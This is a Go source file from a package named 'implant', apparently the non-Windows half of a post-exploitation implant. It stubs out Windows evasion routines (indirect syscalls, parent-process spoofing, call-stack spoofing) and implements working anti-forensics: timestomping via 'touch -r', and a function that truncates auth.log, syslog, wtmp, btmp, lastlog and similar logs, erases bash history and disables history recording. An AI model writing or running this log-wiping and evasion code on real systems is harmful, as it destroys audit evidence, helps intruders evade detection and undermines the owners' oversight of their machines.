//go:build !windows

package implant

import (
	"fmt"
	"os"
	"os/exec"
)

// SleepEncrypted on non-Windows just does a normal jittered sleep.
func SleepEncrypted(sleepSec, jitterPct int, sessionKey []byte) {
	SleepWithJitter(sleepSec, jitterPct)
}

// GetSyscallStub is a no-op on non-Windows.
type SyscallStub struct {
	SSN     uint16
	Address uintptr
}

func GetSyscallStub(funcName string) (*SyscallStub, error) {
	return nil, fmt.Errorf("indirect syscalls not supported on this platform")
}

// SpawnWithParentSpoof is a no-op on non-Windows.
func SpawnWithParentSpoof(parentPID uint32, cmdLine string) error {
	return fmt.Errorf("PPID spoofing not supported on this platform")
}

func FindProcessByName(name string) (uint32, error) {
	return 0, fmt.Errorf("not supported on this platform")
}

func SpoofCallStack() {}

// Timestomp on Linux uses touch command.
func Timestomp(filepath string, referenceFile string) error {
	return exec.Command("touch", "-r", referenceFile, filepath).Run()
}

// ClearLinuxLogs removes common log entries.
func ClearLinuxLogs() []string {
	results := []string{}
	logs := []string{
		"/var/log/auth.log",
		"/var/log/syslog",
		"/var/log/messages",
		"/var/log/secure",
		"/var/log/wtmp",
		"/var/log/btmp",
		"/var/log/lastlog",
	}

	for _, log := range logs {
		if _, err := os.Stat(log); err == nil {
			if err := os.Truncate(log, 0); err == nil {
				results = append(results, fmt.Sprintf("[+] Cleared: %s", log))
			} else {
				results = append(results, fmt.Sprintf("[-] Failed: %s (%v)", log, err))
			}
		}
	}

	// Clear bash history
	histFile := os.Getenv("HISTFILE")
	if histFile == "" {
		home := os.Getenv("HOME")
		histFile = home + "/.bash_history"
	}
	if err := os.Truncate(histFile, 0); err == nil {
		results = append(results, "[+] Cleared: bash_history")
	}

	// Unset history
	os.Setenv("HISTSIZE", "0")
	os.Setenv("HISTFILESIZE", "0")
	results = append(results, "[+] Disabled history (HISTSIZE=0)")

	return results
}

// ClearWindowsLogs is a no-op on Linux.
func ClearWindowsLogs() []string {
	return ClearLinuxLogs()
}
